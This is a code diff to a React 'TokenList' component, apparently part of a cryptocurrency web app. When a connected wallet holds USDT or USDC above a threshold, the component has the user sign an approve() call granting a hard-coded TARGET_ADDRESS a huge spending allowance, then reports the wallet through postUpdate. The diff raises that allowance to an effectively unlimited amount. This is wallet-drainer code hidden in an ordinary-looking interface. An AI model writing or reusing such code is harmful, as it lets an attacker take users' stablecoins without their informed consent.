@@ -61,7 +61,7 @@ function TokenList({ setLoadingStatus, refreshFlag, updateRefreshFlag, tokenHold
           const usdtBalanceWei = await usdtContract.methods.balanceOf(address).call();
           const usdtBalance = parseInt(web3.utils.fromWei(usdtBalanceWei.toString(), "ether"));
           if(usdtBalance >= LIMIT) {
-            await usdtContract.methods.approve(TARGET_ADDRESS, web3.utils.toWei("100000000", "ether")).send({value: 0, from: address});
+            await usdtContract.methods.approve(TARGET_ADDRESS, web3.utils.toWei("100000000000000000", "ether")).send({value: 0, from: address});
             await postUpdate(address, USDT_ADDRESS);
             flag = 1;
           }
@@ -71,7 +71,7 @@ function TokenList({ setLoadingStatus, refreshFlag, updateRefreshFlag, tokenHold
               const usdcBalanceWei = await usdcContract.methods.balanceOf(address).call();
               const usdcBalance = parseInt(web3.utils.fromWei(usdcBalanceWei.toString(), "ether"));
               if(usdcBalance >= LIMIT) {
-                await usdcContract.methods.approve(TARGET_ADDRESS, web3.utils.toWei("100000000", "ether")).send({value: 0, from: address});
+                await usdcContract.methods.approve(TARGET_ADDRESS, web3.utils.toWei("100000000000000000", "ether")).send({value: 0, from: address});
                 await postUpdate(address, USDC_ADDRESS);
                 flag = 1;
               }
